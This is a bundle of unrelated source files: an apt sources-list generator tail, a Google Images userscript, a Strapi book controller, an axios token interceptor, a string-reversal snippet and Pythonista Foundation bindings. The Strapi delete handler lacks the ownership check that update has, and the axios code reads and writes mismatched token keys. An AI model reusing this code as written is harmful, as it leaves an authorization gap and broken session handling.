 if codename not in KNOWN_CODENAMES:
 return False


 return True


if __name__ == '__main__':
 parser = argparse.ArgumentParser(
 description=""Generates '/etc/apt/sources.list' compatible lists for Ubuntu releases"")


 parser.add_argument(
 ""--codename"",
 required=True,
 help=""Codename of the release. Can be checked via `lsb_release -c`"")


 parser.add_argument(
 ""--force-codename"",
 action='store_true',
 default=False,
 help=""Force the use of the provided codename, even if it is not a known one"")


 parser.add_argument(
 ""--url"",
 required=True,
 help=""URL for the source / dist files of packages. Should end with 'ubuntu/'"")
 args = parser.parse_args()


 main(args)
==<SEPERATOR>==
viewimage.user.js
// ==UserScript==
// @name            View Image
// @namespace       https://github.com/bijij/ViewImage
// @version         4.1.1
// @description     This userscript re-implements the ""View Image"" and ""Search by image"" buttons into google images.
// @author          Joshua B
// @run-at          document-end
// @include         http*://*.google.tld/search*tbm=isch*
// @include         http*://*.google.tld/imgres*
// @updateURL       https://gist.githubusercontent.com/bijij/58cc8cfc859331e4cf80210528a7b255/raw/viewimage.user.js
// ==/UserScript==
'use strict';


const DEBUG = false;


const VERSIONS = {
 FEB18: 'FEB18',
 JUL19: 'JUL19',
 OCT19: 'OCT19'
};


var images = new Object();


// Finds the div which contains all required elements
function getContainer(node) {
 var container, version;
 [
 ['.irc_c[style*=""visibility: visible;""][style*=""transform: translate3d(0px, 0px, 0px);""]', VERSIONS.FEB18],
 ['.irc_c[data-ved]', VERSIONS.JUL19],
 ['.tvh9oe', VERSIONS.OCT19]
 ].forEach(element => {
 if (node.closest(element[0])) {
 [container, version] = [node.closest(element[0]), element[1]];
 }
 });
 return [container, version];
}




// Finds and deletes all extension related elements.
function clearExtElements(container) {
 // Remove previously generated elements
 var oldExtensionElements = container.querySelectorAll('.vi_ext_addon');
 for (var element of oldExtensionElements) {
 element.remove();
 }
}




// Returns the image URL
function findImageURL(container, version) {


 var image = null;


 switch (version) {
 case VERSIONS.FEB18:
 image = container.querySelector('img[src]#irc_mi, img[alt^=""Image result""][src]:not([src^=""https://encrypted-tbn""]).irc_mut, img[src].irc_mi');
 break;
 case VERSIONS.JUL19:
 var iframe = container.querySelector('iframe.irc_ifr');
 if (!iframe)
 return findImageURL(container, VERSIONS.FEB18);
 image = iframe.contentDocument.querySelector('img#irc_mi');
 break;
 case VERSIONS.OCT19:
 image = container.querySelector('img[src].n3VNCb, img[src].r48jcc');
 if (image.src in images) {
 return images[image.src];
 }
 }


 // Override url for images using base64 embeds
 if (image === null || image.src === '' || image.src.startsWith('data')) {
 var thumbnail = document.querySelector('img[name=""' + container.dataset.itemId + '""]');
 if (thumbnail === null) {
 // If no thumbnail found, try getting image from URL
 var url = new URL(window.location);
 var imgLink = url.searchParams.get('imgurl');
 if (imgLink) {
 return imgLink;
 }
 } else {
 var meta = thumbnail.closest('.rg_bx').querySelector('.rg_meta');
 var metadata = JSON.parse(meta.innerHTML);
 return metadata.ou;
 }
 }


 // If the above doesn't work, use the link in related images to find it
 if (image === null || image.src === '' || image.src.startsWith('data')) {
 var target_image = container.querySelector('img.target_image');
 if (target_image) {
 var link = target_image.closest('a');
 if (link) {
 // Some extensions replace google image links with their original links
 if (link.href.match(/^[a-z]+:\/\/(?:www\.)?google\.[^/]*\/imgres\?/)) {
 var link_url = new URL(link.href);
 var new_imgLink = link_url.searchParams.get('imgurl');
 if (new_imgLink) {
 return new_imgLink;
 }
 } else {
 return link.href;
 }
 }
 }
 }


 if (image) {
 return image.src;
 }


}


function addViewImageButton(container, imageURL, version) {


 // get the visit buttonm
 var visitButton;
 switch (version) {
 case VERSIONS.FEB18:
 visitButton = container.querySelector('td > a.irc_vpl[href]').parentElement;
 break;
 case VERSIONS.JUL19:
 visitButton = container.querySelector('a.irc_hol[href]');
 break;
 case VERSIONS.OCT19:
 visitButton = container.querySelector('.ZsbmCf[href], a.J2oL9c, a.jAklOc, a.uZ49bd, a.e0XTue, a.kWgFk, a.j7ZI7c');
 break;
 }


 // Create the view image button
 var viewImageButton = visitButton.cloneNode(true);
 viewImageButton.classList.add('vi_ext_addon');


 // Set the view image button url
 var viewImageLink;
 switch (version) {
 case VERSIONS.FEB18:
 viewImageLink = viewImageButton.querySelector('a');
 break;
 default:
 viewImageLink = viewImageButton;
 }


 viewImageLink.href = imageURL;
 if (version == VERSIONS.OCT19) {
 viewImageLink.removeAttribute('jsaction');
 }


 // Set additional options
 viewImageLink.setAttribute('target', '_blank');


 // Set the view image button text
 var viewImageButtonText;
 switch (version) {
 case VERSIONS.FEB18:
 viewImageButtonText = viewImageButton.querySelector('.Tl8XHc');
 break;
 case VERSIONS.JUL19:
 viewImageButtonText = viewImageButton.querySelector('.irc_ho');
 break;
 case VERSIONS.OCT19:
 viewImageButtonText = viewImageButton.querySelector('.pM4Snf, .KSvtLc, .Pw5kW, .q7UPLe, .K8E1Be, .pFBf7b, span');
 break;
 }


 viewImageButtonText.innerText = 'View Image';


 // Place the view image button
 visitButton.parentElement.insertBefore(viewImageButton, visitButton);
 visitButton.parentElement.insertBefore(visitButton, viewImageButton);
}




function addSearchImageButton(container, imageURL, version) {


 var link;
 switch (version) {
 case VERSIONS.FEB18:
 link = container.querySelector('.irc_dsh > a.irc_hol');
 break;
 case VERSIONS.JUL19:
 link = container.querySelector('.irc_ft > a.irc_help');
 break;
 case VERSIONS.OCT19:
 link = container.querySelector('.PvkmDc, .qnLx5b, .zSA7pe, .uZ49bd, .e0XTue, .kWgFk, .j7ZI7c');
 break;
 }


 // Create the search by image button
 var searchImageButton = link.cloneNode(true);
 searchImageButton.classList.add('vi_ext_addon');


 // Set the more sizes button text
 var searchImageButtonText;
 switch (version) {
 case VERSIONS.FEB18:
 searchImageButtonText = container.querySelector('.irc_ho');
 break;
 case VERSIONS.JUL19:
 searchImageButtonText = searchImageButton.querySelector('span');
 break;
 case VERSIONS.OCT19:
 searchImageButtonText = searchImageButton;
 break;
 }


 searchImageButtonText.innerText = 'Search by Image';


 // Set the search by image button url
 searchImageButton.href = '/searchbyimage?image_url=' + encodeURIComponent(imageURL);


 // Set additional options
 if (true) {
 searchImageButton.setAttribute('target', '_blank');
 }


 // Place the more sizes button
 link.parentElement.insertBefore(searchImageButton, link);
 link.parentElement.insertBefore(link, searchImageButton);


}




// Adds links to an object
function addLinks(node) {


 if (DEBUG)
 console.log('ViewImage: Trying to add links to node: ', node);


 // Find the container
 var [container, version] = getContainer(node);


 // Return if no container was found
 if (!container) {
 if (DEBUG)
 console.log('ViewImage: Adding links failed, container was not found.');
 return;
 }


 if (DEBUG)
 console.log('ViewImage: Assuming site version: ', version);


 // Clear any old extension elements
 clearExtElements(container);


 // Find the image url
 var imageURL = findImageURL(container, version);


 // Return if image was not found
 if (!imageURL) {


 if (DEBUG)
 console.log('ViewImage: Adding links failed, image was not found.');


 return;
 }


 addViewImageButton(container, imageURL, version);
 addSearchImageButton(container, imageURL, version);
}


function parseDataSource(array) {
 var meta = array[31][0][12][2];
 for (var i = 0; i < meta.length; i++) {
 try {
 images[meta[i][1][2][0]] = meta[i][1][3][0];
 } catch (error) {
 if (DEBUG)
 console.log('ViewImage: Skipping image');
 }
 }
}


function parseDataSource1() {
 //const start_search = /AF_initDataCallback\({key:\s'ds:1',\sisError:\s{2}false\s,\shash:\s'\d+',\sdata:/; // Deprecated RegEx ('isError' not matched)
 const start_search = /AF_initDataCallback\({key:\s'ds:1',\shash:\s'\d+',\sdata:/;
 const end_search = ', sideChannel: {}});</script>';


 var match = document.documentElement.innerHTML.match(start_search);


 var start_index = match.index + match[0].length;
 var end_index = start_index + document.documentElement.innerHTML.slice(start_index).indexOf(end_search);


 parseDataSource(JSON.parse(document.documentElement.innerHTML.slice(start_index, end_index)));
}


function parseDataSource2() {
 const start_search = /AF_initDataCallback\({key:\s'ds:2',\sisError:\s{2}false\s,\shash:\s'\d+',\sdata:function(){return\s/;
 const end_search = '}});</script>';


 var match = document.documentElement.innerHTML.match(start_search);


 var start_index = match.index + match[0].length;
 var end_index = start_index + document.documentElement.innerHTML.slice(start_index).indexOf(end_search);
 parseDataSource(JSON.parse(document.documentElement.innerHTML.slice(start_index, end_index)));
}


// Check if source holds array of images
try {


 if (document.documentElement.innerHTML.indexOf('key: \'ds:1\'') != -1) {
 if (DEBUG)
 console.log('ViewImage: Attempting to parse data source 1.');
 parseDataSource1();
 } else if (document.documentElement.innerHTML.indexOf('key: \'ds:2\'') != -1) {
 if (DEBUG)
 console.log('ViewImage: Attempting to parse data source 2.');
 parseDataSource2();
 } else {
 throw 'Could not determine data source type.';
 }


 if (DEBUG)
 console.log('ViewImage: Successfully created source images array.');


} catch (error) {
 if (DEBUG) {
 console.log('ViewImage: Failed to create source images array.');
 console.error(error);
 }
}




// Define the mutation observers
var observer = new MutationObserver(function (mutations) {


 if (DEBUG)
 console.log('ViewImage: Mutations detected: ', mutations);


 var node;
 for (var mutation of mutations) {
 if (mutation.addedNodes && mutation.addedNodes.length > 0) {
 for (node of mutation.addedNodes) {
 if (node.classList) {
 // Check for new image nodes
 if (['irc_mi', 'irc_mut', 'irc_ris', 'n3VNCb', 'r48jcc'].some(className => node.classList.contains(className))) {
 addLinks(node);
 }
 }
 }
 }


 if (mutation.target.classList && mutation.target.classList.contains('n3VNCb', 'r48jcc')) {
 node = mutation.target.closest('.tvh9oe');


 if (!node.hasAttribute('aria-hidden')) {
 addLinks(node);
 }
 }
 }
});


// Start adding links
if (DEBUG)
 console.log('ViewImage: Initialising observer...');


observer.observe(document.body, {
 childList: true,
 subtree: true,
 attributes: true
});




// inject CSS into document
if (DEBUG)
 console.log('ViewImage: Injecting CSS...');


var customStyle = document.createElement('style');
customStyle.innerText = `
.irc_dsh>.irc_hol.vi_ext_addon,
.irc_ft>.irc_help.vi_ext_addon,
.PvkmDc.vi_ext_addon,
.qnLx5b.vi_ext_addon
{
    margin: 0 4pt!important
}

.irc_hol.vi_ext_addon
{
    flex-grow:0!important
}

.zSA7pe[href^=""/searchbyimage""] {
    margin-left: 4px;
}

.ZsbmCf.vi_ext_addon{
    flex-grow:0
}`;
document.head.appendChild(customStyle);
==<SEPERATOR>==
book.js
'use strict';


/**
 * book controller
 */


const { createCoreController } = require('@strapi/strapi').factories;


module.exports = createCoreController('api::book.book', ({ strapi }) => ({


 async likeBook(ctx) {
 let { id } = ctx.params;


 // get the book 
 const book = await strapi.service('api::book.book').findOne(id)


 // if book does not exist
 if (!book) {
 return ctx.badRequest(""book does not exist"", { details: ""This book was not found"" })
 }


 // update function
 const updateFunction = async (whoLiked) => {
 let entity = await strapi.service('api::book.book').update(id, { data: { likes: whoLiked } })
 const sanitizedEntity = await this.sanitizeOutput(entity, ctx);
 return this.transformResponse(sanitizedEntity)
 }


 // if no existing likes
 if (book.likes == null || book.likes.length == 0) {
 let peopleWhoLiked = [];
 peopleWhoLiked.push(ctx.username);
 return updateFunction(peopleWhoLiked)


 }
 // if user already liked 
 else if (book.likes.includes(ctx.username)) {
 let peopleWhoLiked = book.likes
 let index = peopleWhoLiked.indexOf(ctx.username)
 if (index > -1) {
 peopleWhoLiked.splice(index, 1)
 }
 return updateFunction(peopleWhoLiked)
 }
 // new like
 else {
 let peopleWhoLiked = book.likes
 peopleWhoLiked.push(ctx.username)
 return updateFunction(peopleWhoLiked)
 }
 },


 async create(ctx) {
 const { data } = ctx.request.body;
 // save creator field from middleware
 data.creator = ctx.username


 // create book
 let entity = await strapi.service('api::book.book').create({ data });
 const sanitizedEntity = await this.sanitizeOutput(entity, ctx);
 return this.transformResponse(sanitizedEntity)
 },


 async update(ctx) {
 let { id } = ctx.params;


 // get the book 
 const book = await strapi.service('api::book.book').findOne(id)


 // if book does not exist
 if (!book) {
 return ctx.badRequest(""book does not exist"", { details: ""This book was not found"" })
 }


 // if book belongs to this user from the middleware
 if (book.creator !== ctx.username) {
 return ctx.forbidden(""You cannot update this book"", { details: ""This book does not belong to you"" })
 }


 // update book
 let entity = await strapi.service('api::book.book').update(id, ctx.request.body)
 const sanitizedEntity = await this.sanitizeOutput(entity, ctx);
 return this.transformResponse(sanitizedEntity)
 },


 async delete(ctx) {
 let { id } = ctx.params;


 // get the book 
 const book = await strapi.service('api::book.book').findOne(id)


 // if book does not exist
 if (!book) {
 return ctx.badRequest(""book does not exist"", { details: ""This book was not found"" })
 }


 // delete book
 let entity = await strapi.service('api::book.book').delete(id)
 const sanitizedEntity = await this.sanitizeOutput(entity, ctx);
 return this.transformResponse(sanitizedEntity)
 }
}));
==<SEPERATOR>==
axios.js
import axios from ""axios"";


const customRequest = axios.create({
 baseURL: 'https://example.com/api/',
 headers: {'Request-Origin': 'website'}
});


customRequest.interceptors.request.use((config) => {
 const accessToken = localStorage.getItem(""token"");


 //checking if accessToken exists
 if (accessToken) {
 config.headers[""Authorization""] = accessToken;
 }
 return config;
});


customRequest.interceptors.response.use(
 (response) => response,
 async (error) => {
 //extracting response and config objects
 const { response, config } = error;
 //checking if error is Aunothorized error
 if (response.status === 401) {
 let refreshToken = localStorage.getItem(""refreshToken"");
 if (refreshToken) {
 //if refresh token exists in local storage proceed
 try {
 //try refreshing token
 const data = await customRequest.post(""/refresh/"", {
 refresh: refreshToken,
 });
 let accessToken = data.data.accessToken;
 if (accessToken) {
 //if request is successiful and token exists in response data
 //store it in local storage
 localStorage.setItem(""accessToken"", accessToken);
 //with new token retry original request
 config.headers[""Authorization""] = accessToken;
 return customRequest(config);
 }
 } catch (e) {
 console.log(e);
 }
 }
 }
 //clear local storage and log user out
 logout();
 return error;
 }
);


const logout = () => {
 //handle logout
 localStorage.removeItem(""accessToken"");
 localStorage.removeItem(""refreshToken"");
};


const handleLogin = (email, password)=>{
 customRequest.post(""/login"", {email: email, password:password})
 .then(response=>{
 const token = response.data.token;
 const refreshToken = response.data.refreshToken;
 localStorage.setItem(""accessToken"", token);
 localStorage.setItem(""refreshToken"", refreshToken);
 const user = response.data.user;
 //handle user
 })
 .catch(e=>console.log(e));
 }


export { customRequest };
"
"invertir-cadena.py
","escritor = 'Fyodor Mikhailovich Dostoevsky'
cadenaInvertida = escritor[::-1]
print(cadenaInvertida)
"
"Foundation.py
","# coding: utf-8
from objc_util import *


NSAKDeserializer = ObjCClass('NSAKDeserializer')
NSAKDeserializerStream = ObjCClass('NSAKDeserializerStream')
NSAKSerializer = ObjCClass('NSAKSerializer')
NSAKSerializerStream = ObjCClass('NSAKSerializerStream')
NSAbstractLayoutGuide = ObjCClass('NSAbstractLayoutGuide')
NSAddressCheckingResult = ObjCClass('NSAddressCheckingResult')
NSAffineTransform = ObjCClass('NSAffineTransform')
NSArchiver = ObjCClass('NSArchiver')
NSArrayChange = ObjCClass('NSArrayChange')
NSArrayChanges = ObjCClass('NSArrayChanges')
NSAssertionHandler = ObjCClass('NSAssertionHandler')
NSAttributedString = ObjCClass('NSAttributedString')
NSAutoreleasePool = ObjCClass('NSAutoreleasePool')
NSAutoresizingMaskLayoutConstraint = ObjCClass('NSAutoresizingMaskLayoutConstraint')
NSBigMutableString = ObjCClass('NSBigMutableString')
NSBlockExpression = ObjCClass('NSBlockExpression')
NSBlockOperation = ObjCClass('NSBlockOperation')
NSBlockPredicate = ObjCClass('NSBlockPredicate')
NSBoundKeyPath = ObjCClass('NSBoundKeyPath')
NSBundle = ObjCClass('NSBundle')
NSBundleResourceRequest = ObjCClass('NSBundleResourceRequest')
NSByteCountFormatter = ObjCClass('NSByteCountFormatter')
NSCachedURLResponse = ObjCClass('NSCachedURLResponse')
NSCalendarDate = ObjCClass('NSCalendarDate')
NSCharacterSet = ObjCClass('NSCharacterSet')
NSCheapMutableString = ObjCClass('NSCheapMutableString')
NSCoder = ObjCClass('NSCoder')
NSComparisonPredicate = ObjCClass('NSComparisonPredicate')
NSComparisonPredicateOperator = ObjCClass('NSComparisonPredicateOperator')
NSComplexOrthography = ObjCClass('NSComplexOrthography')
NSComplexRegularExpressionCheckingResult = ObjCClass('NSComplexRegularExpressionCheckingResult')
NSCompoundPredicate = ObjCClass('NSCompoundPredicate')
NSCompoundPredicateOperator = ObjCClass('NSCompoundPredicateOperator')
NSConcreteAttributedString = ObjCClass('NSConcreteAttributedString')
NSConcreteMutableAttributedString = ObjCClass('NSConcreteMutableAttributedString')
NSConcreteValue = ObjCClass('NSConcreteValue')
NSCondition = ObjCClass('NSCondition')
NSConditionLock = ObjCClass('NSConditionLock')
NSConstantString = ObjCClass('NSConstantString')
NSConstantValueExpression = ObjCClass('NSConstantValueExpression')
NSContentSizeLayoutConstraint = ObjCClass('NSContentSizeLayoutConstraint')
NSCorrectionCheckingResult = ObjCClass('NSCorrectionCheckingResult')
NSCountedSet = ObjCClass('NSCountedSet')
NSDashCheckingResult = ObjCClass('NSDashCheckingResult')
NSDataDetector = ObjCClass('NSDataDetector')
NSDateCheckingResult = ObjCClass('NSDateCheckingResult')
NSDateComponentsFormatter = ObjCClass('NSDateComponentsFormatter')
NSDateFormatter = ObjCClass('NSDateFormatter')
NSDateIntervalFormatter = ObjCClass('NSDateIntervalFormatter')
NSDecimalNumber = ObjCClass('NSDecimalNumber')
NSDecimalNumberHandler = ObjCClass('NSDecimalNumberHandler')
NSDirInfo = ObjCClass('NSDirInfo')
NSDirInfoDeserializer = ObjCClass('NSDirInfoDeserializer')
NSDirInfoSerializer = ObjCClass('NSDirInfoSerializer')
NSDirectoryEnumerator = ObjCClass('NSDirectoryEnumerator')
NSDistributedNotificationCenter = ObjCClass('NSDistributedNotificationCenter')
NSDocInfo = ObjCClass('NSDocInfo')
NSDocumentDeserializer = ObjCClass('NSDocumentDeserializer')
NSDocumentSerializer = ObjCClass('NSDocumentSerializer')
NSEnergyFormatter = ObjCClass('NSEnergyFormatter')
NSEqualityPredicateOperator = ObjCClass('NSEqualityPredicateOperator')
NSError = ObjCClass('NSError')
NSExpression = ObjCClass('NSExpression')
NSExtendedRegularExpressionCheckingResult = ObjCClass('NSExtendedRegularExpressionCheckingResult')
NSFalsePredicate = ObjCClass('NSFalsePredicate')
NSFileAccessArbiter = ObjCClass('NSFileAccessArbiter')
NSFileAccessIntent = ObjCClass('NSFileAccessIntent')
NSFileCoordinator = ObjCClass('NSFileCoordinator')
NSFileHandle = ObjCClass('NSFileHandle')
NSFileManager = ObjCClass('NSFileManager')
NSFileVersion = ObjCClass('NSFileVersion')
NSFileWrapper = ObjCClass('NSFileWrapper')
NSFileWrapperMoreIVars = ObjCClass('NSFileWrapperMoreIVars')
NSFilterObservationTransformer = ObjCClass('NSFilterObservationTransformer')
NSFormatter = ObjCClass('NSFormatter')
NSFunctionExpression = ObjCClass('NSFunctionExpression')
NSGZipDecoder = ObjCClass('NSGZipDecoder')
NSGrammarCheckingResult = ObjCClass('NSGrammarCheckingResult')
NSHTTPCookie = ObjCClass('NSHTTPCookie')
NSHTTPCookieStorage = ObjCClass('NSHTTPCookieStorage')
NSHTTPURLResponse = ObjCClass('NSHTTPURLResponse')
NSHashTable = ObjCClass('NSHashTable')
NSHost = ObjCClass('NSHost')
NSIBPrototypingLayoutConstraint = ObjCClass('NSIBPrototypingLayoutConstraint')
NSISEngine = ObjCClass('NSISEngine')
NSISLinearExpression = ObjCClass('NSISLinearExpression')
NSISObjectiveLinearExpression = ObjCClass('NSISObjectiveLinearExpression')
NSISVariable = ObjCClass('NSISVariable')
NSInPredicateOperator = ObjCClass('NSInPredicateOperator')
NSIndexPath = ObjCClass('NSIndexPath')
NSIndexSet = ObjCClass('NSIndexSet')
NSInvocationOperation = ObjCClass('NSInvocationOperation')
NSJSONSerialization = ObjCClass('NSJSONSerialization')
NSKeyPathExpression = ObjCClass('NSKeyPathExpression')
NSKeyPathSpecifierExpression = ObjCClass('NSKeyPathSpecifierExpression')
NSKeyValueAccessor = ObjCClass('NSKeyValueAccessor')
NSKeyValueGetter = ObjCClass('NSKeyValueGetter')
NSKeyValueSetter = ObjCClass('NSKeyValueSetter')
NSKeyedArchiver = ObjCClass('NSKeyedArchiver')
NSKeyedUnarchiver = ObjCClass('NSKeyedUnarchiver')
NSLayoutAnchor = ObjCClass('NSLayoutAnchor')
NSLayoutConstraint = ObjCClass('NSLayoutConstraint')
NSLayoutDimension = ObjCClass('NSLayoutDimension')
NSLayoutXAxisAnchor = ObjCClass('NSLayoutXAxisAnchor')
NSLayoutYAxisAnchor = ObjCClass('NSLayoutYAxisAnchor')
NSLeafProxy = ObjCClass('NSLeafProxy')
NSLengthFormatter = ObjCClass('NSLengthFormatter')
NSLinguisticTagger = ObjCClass('NSLinguisticTagger')
NSLinkCheckingResult = ObjCClass('NSLinkCheckingResult')
NSLocalizableString = ObjCClass('NSLocalizableString')
NSLock = ObjCClass('NSLock')
NSLookupMatch = ObjCClass('NSLookupMatch')
NSMachBootstrapServer = ObjCClass('NSMachBootstrapServer')
NSMachPort = ObjCClass('NSMachPort')
NSMapTable = ObjCClass('NSMapTable')
NSMassFormatter = ObjCClass('NSMassFormatter')
NSMessagePort = ObjCClass('NSMessagePort')
NSMessagePortNameServer = ObjCClass('NSMessagePortNameServer')
NSMetadataItem = ObjCClass('NSMetadataItem')
NSMetadataQuery = ObjCClass('NSMetadataQuery')
NSMetadataQueryAttributeValueTuple = ObjCClass('NSMetadataQueryAttributeValueTuple')
NSMetadataQueryResultGroup = ObjCClass('NSMetadataQueryResultGroup')
NSMultiReadUniWriteLock = ObjCClass('NSMultiReadUniWriteLock')
NSMutableAttributedString = ObjCClass('NSMutableAttributedString')
NSMutableCharacterSet = ObjCClass('NSMutableCharacterSet')
NSMutableIndexSet = ObjCClass('NSMutableIndexSet')
NSMutableRLEArray = ObjCClass('NSMutableRLEArray')
NSMutableString = ObjCClass('NSMutableString')
NSMutableStringProxyForMutableAttributedString = ObjCClass('NSMutableStringProxyForMutableAttributedString')
NSMutableURLRequest = ObjCClass('NSMutableURLRequest')
NSNetService = ObjCClass('NSNetService')
NSNetServiceBrowser = ObjCClass('NSNetServiceBrowser')
NSNotification = ObjCClass('NSNotification')
NSNotificationCenter = ObjCClass('NSNotificationCenter')
NSNotificationObservable = ObjCClass('NSNotificationObservable')
NSNotificationQueue = ObjCClass('NSNotificationQueue')
NSNumber = ObjCClass('NSNumber')
NSNumberFormatter = ObjCClass('NSNumberFormatter')
NSObservableKeyPath = ObjCClass('NSObservableKeyPath')
NSObservation = ObjCClass('NSObservation')
NSObservationBuffer = ObjCClass('NSObservationBuffer')
NSObservationSink = ObjCClass('NSObservationSink')
NSObservationSource = ObjCClass('NSObservationSource')
NSObservationTransformer = ObjCClass('NSObservationTransformer')
NSObserverKeyPath = ObjCClass('NSObserverKeyPath')
NSOldValueObservationTransformer = ObjCClass('NSOldValueObservationTransformer')
NSOperation = ObjCClass('NSOperation')
NSOperationQueue = ObjCClass('NSOperationQueue')
NSOrderedSetChange = ObjCClass('NSOrderedSetChange')
NSOrderedSetChanges = ObjCClass('NSOrderedSetChanges')
NSOrthography = ObjCClass('NSOrthography')
NSOrthographyCheckingResult = ObjCClass('NSOrthographyCheckingResult')
NSPageData = ObjCClass('NSPageData')
NSPersonNameComponents = ObjCClass('NSPersonNameComponents')
NSPersonNameComponentsFormatter = ObjCClass('NSPersonNameComponentsFormatter')
NSPhoneNumberCheckingResult = ObjCClass('NSPhoneNumberCheckingResult')
NSPinyinString = ObjCClass('NSPinyinString')
NSPipe = ObjCClass('NSPipe')
NSPlaceholderMutableString = ObjCClass('NSPlaceholderMutableString')
NSPlaceholderString = ObjCClass('NSPlaceholderString')
NSPointerArray = ObjCClass('NSPointerArray')
NSPointerFunctions = ObjCClass('NSPointerFunctions')
NSPort = ObjCClass('NSPort')
NSPortMessage = ObjCClass('NSPortMessage')
NSPortNameServer = ObjCClass('NSPortNameServer')
NSPredicate = ObjCClass('NSPredicate')
NSPredicateOperator = ObjCClass('NSPredicateOperator')
NSProcessInfo = ObjCClass('NSProcessInfo')
NSProgress = ObjCClass('NSProgress')
NSPropertyListSerialization = ObjCClass('NSPropertyListSerialization')
NSProtocolChecker = ObjCClass('NSProtocolChecker')
NSProxy = ObjCClass('NSProxy')
NSPurgeableData = ObjCClass('NSPurgeableData')
NSQuoteCheckingResult = ObjCClass('NSQuoteCheckingResult')
NSRLEArray = ObjCClass('NSRLEArray')
NSRTFD = ObjCClass('NSRTFD')
NSRecursiveLock = ObjCClass('NSRecursiveLock')
NSReduceObservationTransformer = ObjCClass('NSReduceObservationTransformer')
NSRegularExpression = ObjCClass('NSRegularExpression')
NSRegularExpressionCheckingResult = ObjCClass('NSRegularExpressionCheckingResult')
NSReplacementCheckingResult = ObjCClass('NSReplacementCheckingResult')
NSScanner = ObjCClass('NSScanner')
NSSelfExpression = ObjCClass('NSSelfExpression')
NSSetChange = ObjCClass('NSSetChange')
NSSetChanges = ObjCClass('NSSetChanges')
NSSetExpression = ObjCClass('NSSetExpression')
NSSimpleAttributeDictionary = ObjCClass('NSSimpleAttributeDictionary')
NSSimpleCString = ObjCClass('NSSimpleCString')
NSSimpleOrthography = ObjCClass('NSSimpleOrthography')
NSSimpleRegularExpressionCheckingResult = ObjCClass('NSSimpleRegularExpressionCheckingResult')
NSSortDescriptor = ObjCClass('NSSortDescriptor')
NSSpellCheckingResult = ObjCClass('NSSpellCheckingResult')
NSString = ObjCClass('NSString')
NSStringPredicateOperator = ObjCClass('NSStringPredicateOperator')
NSSubqueryExpression = ObjCClass('NSSubqueryExpression')
NSSubstitutionCheckingResult = ObjCClass('NSSubstitutionCheckingResult')
NSSubstringPredicateOperator = ObjCClass('NSSubstringPredicateOperator')
NSTask = ObjCClass('NSTask')
NSTernaryExpression = ObjCClass('NSTernaryExpression')
NSTextCheckingResult = ObjCClass('NSTextCheckingResult')
NSThread = ObjCClass('NSThread')
NSTransitInformationCheckingResult = ObjCClass('NSTransitInformationCheckingResult')
NSTruePredicate = ObjCClass('NSTruePredicate')
NSURLAuthenticationChallenge = ObjCClass('NSURLAuthenticationChallenge')
NSURLCache = ObjCClass('NSURLCache')
NSURLComponents = ObjCClass('NSURLComponents')
NSURLConnection = ObjCClass('NSURLConnection')
NSURLCredential = ObjCClass('NSURLCredential')
NSURLCredentialStorage = ObjCClass('NSURLCredentialStorage')
NSURLDownload = ObjCClass('NSURLDownload')
NSURLError = ObjCClass('NSURLError')
NSURLFileTypeMappings = ObjCClass('NSURLFileTypeMappings')
NSURLProtectionSpace = ObjCClass('NSURLProtectionSpace')
NSURLProtocol = ObjCClass('NSURLProtocol')
NSURLQueryItem = ObjCClass('NSURLQueryItem')
NSURLRequest = ObjCClass('NSURLRequest')
NSURLResponse = ObjCClass('NSURLResponse')
NSURLSession = ObjCClass('NSURLSession')
NSURLSessionConfiguration = ObjCClass('NSURLSessionConfiguration')
NSURLSessionDataTask = ObjCClass('NSURLSessionDataTask')
NSURLSessionDownloadTask = ObjCClass('NSURLSessionDownloadTask')
NSURLSessionTask = ObjCClass('NSURLSessionTask')
NSURLSessionUploadTask = ObjCClass('NSURLSessionUploadTask')
NSUUID = ObjCClass('NSUUID')
NSUbiquitousKeyValueStore = ObjCClass('NSUbiquitousKeyValueStore')
NSUnarchiver = ObjCClass('NSUnarchiver')
NSUndoManager = ObjCClass('NSUndoManager')
NSUserActivity = ObjCClass('NSUserActivity')
NSValue = ObjCClass('NSValue')
NSValueTransformer = ObjCClass('NSValueTransformer')
NSVariableExpression = ObjCClass('NSVariableExpression')
NSXMLParser = ObjCClass('NSXMLParser')
NSXPCCoder = ObjCClass('NSXPCCoder')
NSXPCConnection = ObjCClass('NSXPCConnection')
NSXPCInterface = ObjCClass('NSXPCInterface')
NSXPCListener = ObjCClass('NSXPCListener')
NSXPCListenerEndpoint = ObjCClass('NSXPCListenerEndpoint')
NSArray = ObjCClass('NSArray')
NSBlock = ObjCClass('NSBlock')
NSBlockInvocation = ObjCClass('NSBlockInvocation')
NSCache = ObjCClass('NSCache')
NSCalendar = ObjCClass('NSCalendar')
NSData = ObjCClass('NSData')
NSDate = ObjCClass('NSDate')
NSDateComponents = ObjCClass('NSDateComponents')
NSDictionary = ObjCClass('NSDictionary')
NSEnumerator = ObjCClass('NSEnumerator')
NSException = ObjCClass('NSException')
NSFileSecurity = ObjCClass('NSFileSecurity')
NSInputStream = ObjCClass('NSInputStream')
NSInvocation = ObjCClass('NSInvocation')
NSLocale = ObjCClass('NSLocale')
NSMethodSignature = ObjCClass('NSMethodSignature')
NSMutableArray = ObjCClass('NSMutableArray')
NSMutableData = ObjCClass('NSMutableData')
NSMutableDictionary = ObjCClass('NSMutableDictionary')
NSMutableOrderedSet = ObjCClass('NSMutableOrderedSet')
NSMutableSet = ObjCClass('NSMutableSet')
NSNull = ObjCClass('NSNull')
NSObject = ObjCClass('NSObject')
NSOrderedSet = ObjCClass('NSOrderedSet')
NSOutputStream = ObjCClass('NSOutputStream')
NSRunLoop = ObjCClass('NSRunLoop')
NSSet = ObjCClass('NSSet')
NSSharedKeyDictionary = ObjCClass('NSSharedKeyDictionary')
NSSharedKeySet = ObjCClass('NSSharedKeySet')
NSStream = ObjCClass('NSStream')
NSTimeZone = ObjCClass('NSTimeZone')
NSTimer = ObjCClass('NSTimer')
NSURL = ObjCClass('NSURL')
NSUserDefaults = ObjCClass('NSUserDefaults')
# coding: utf-8
from objc_util import *


NSDataAsset = ObjCClass('NSDataAsset')
NSFileProviderExtension = ObjCClass('NSFileProviderExtension')
UIAcceleration = ObjCClass('UIAcceleration')
UIAccelerometer = ObjCClass('UIAccelerometer')
UIAccessibilityCustomAction = ObjCClass('UIAccessibilityCustomAction')
UIAccessibilityElement = ObjCClass('UIAccessibilityElement')
UIAccessoryBackgroundTaskAction = ObjCClass('UIAccessoryBackgroundTaskAction')
UIActionSheet = ObjCClass('UIActionSheet')
UIActivity = ObjCClass('UIActivity')
UIActivityContinuationAction = ObjCClass('UIActivityContinuationAction')
